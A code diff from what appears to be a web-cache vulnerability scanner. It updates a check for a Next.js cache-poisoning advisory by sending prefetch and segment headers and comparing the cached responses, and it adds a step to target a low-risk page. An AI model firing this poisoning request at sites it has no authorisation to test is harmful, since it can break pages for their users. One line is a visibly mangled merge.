@@ -7,8 +7,10 @@ https://github.com/vercel/next.js/security/advisories/GHSA-67rr-84xm-4c7r
 Thanks Wlayzz for the PoC !
 """
 
-from modules.utils import requests, random, sys, configure_logger, re, Identify, Colors
+from utils.utils import requests, random, sys, configure_logger, re
+from utils.style import Identify, Colors
 from urllib.parse import urljoin, urlparse
+from modules.cp_cve.unrisk_page import get_unrisk_page
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
@@ -26,19 +28,21 @@ def valid_cache(uri, req, req_h, headers):
 
 def nextjs_204(url):
     url = f"{url}?cve={random.randrange(99)}"
-    uri = f"{url}{random.randrange(99)}"
-    #sys.exit()
+    #sys.exit()url = f"{url}?cve={random.randrange(99)}"
     headers = {
-        "User-agent": "xxxxxxxx",
+        "User-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
         "Rsc": "1",
         "Next-Router-Prefetch": "1",
         "Next-Router-Segment-Prefetch": "/nonexistent_segment"
     }
     try:
         req = requests.get(url, verify=False, allow_redirects=False, timeout=10)
-        req_h = requests.get(uri, headers=headers, verify=False, allow_redirects=False, timeout=10)
-        if req.status_code != req_h.status_code and req.status_code not in [403, 429]:
-            valid_cache(uri, req, req_h, headers)
+        unrisk_page = get_unrisk_page(url, req)
+        if unrisk_page:
+            uri = f"{unrisk_page}?cve={random.randrange(999)}"
+            req_h = requests.get(uri, headers=headers, verify=False, allow_redirects=False, timeout=10)
+            if req.status_code != req_h.status_code and req.status_code not in [403, 429]:
+                valid_cache(uri, req, req_h, headers)
     except requests.Timeout:
         #print(f"request timeout {url} {p}")
         pass
